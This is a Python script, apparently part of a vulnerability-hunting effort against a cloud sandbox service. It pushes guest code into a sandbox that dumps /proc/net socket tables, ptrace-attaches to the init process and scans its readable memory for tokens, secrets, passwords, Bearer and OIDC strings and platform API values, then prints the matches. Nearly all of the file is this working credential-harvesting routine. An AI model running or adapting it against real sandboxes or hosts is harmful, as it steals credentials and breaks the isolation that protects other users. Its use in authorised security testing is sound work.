# -*- coding: utf-8 -*-
"""Phase29: 轻量 attach 读 init heap + socket 归属(/proc/net/vsock/unix/tcp)"""
import sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, fresh_sandbox_deny_all

GUEST = r'''
import os, re, ctypes, time

libc = ctypes.CDLL(None, use_errno=True)

# 1) socket 归属 (不 attach)
for f in ['/proc/net/vsock', '/proc/net/unix', '/proc/net/tcp']:
    try:
        print('[%s]\n%s' % (f, open(f).read()[:2200]), flush=True)
    except Exception as e:
        print('[%s] ERR %s' % (f, e), flush=True)

# 2) 快速 attach -> 读关键区域 -> detach (<4s)
rc = libc.ptrace(16, 1, None, None)  # ATTACH
print('[attach] rc=%d errno=%d' % (rc, ctypes.get_errno()), flush=True)
time.sleep(0.4)

KEYS = [b'vcp_', b'token', b'Token', b'secret', b'password', b'GIT_', b'vsock',
        b'http://', b'https://', b'api.vercel.com', b'oidc', b'Bearer', b'sandbox',
        b'network-policy', b'forward', b'cmd', b'proxy', b'unix://', b'grpc']
targets = []
for line in open('/proc/1/maps'):
    parts = line.split()
    if len(parts) < 2 or 'r' not in parts[1]:
        continue
    if 'x' in parts[1] or '[' in line:
        continue
    lo, hi = parts[0].split('-')
    addr, end = int(lo, 16), int(hi, 16)
    if end - addr > 0x1000000:  # only <=16MB regions
        continue
    targets.append((addr, end))

found = {}
total = 0
try:
    mem = open('/proc/1/mem', 'rb')
    for addr, end in targets:
        pos = addr
        while pos < end:
            try:
                mem.seek(pos)
                chunk = mem.read(min(0x100000, end - pos))
            except Exception:
                break
            if not chunk:
                break
            total += len(chunk)
            for k in KEYS:
                for m in re.finditer(re.escape(k), chunk):
                    s = max(0, m.start() - 70)
                    e = min(len(chunk), m.end() + 180)
                    found.setdefault(k.decode('latin1'), []).append(
                        '0x%x:%s' % (pos + m.start(), chunk[s:e].replace(b'\x00', b' ').decode('latin1', 'replace')))
            pos += len(chunk)
    mem.close()
except Exception as e:
    print('[mem] ERR %s' % e, flush=True)
print('[scan] total=%d' % total, flush=True)
for k, v in found.items():
    print('== %s (%d) ==' % (k, len(v)), flush=True)
    for item in v[:12]:
        print('   %s' % item[:330], flush=True)

libc.ptrace(17, 1, None, None)  # DETACH
print('detached', flush=True)
print('done', flush=True)
'''
code = "cat > /tmp/pg37.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg37.py"

if __name__ == "__main__":
    sid = "sbx_9efDIoJf3GAsZlyPJy9MQm6k9MMO"  # fwtest13
    time.sleep(1)
    c, r = cmd(sid, "bash", ["-lc", code], timeout_ms=90000)
    print('cmd:', c, flush=True)
    print(r[:12000], flush=True)
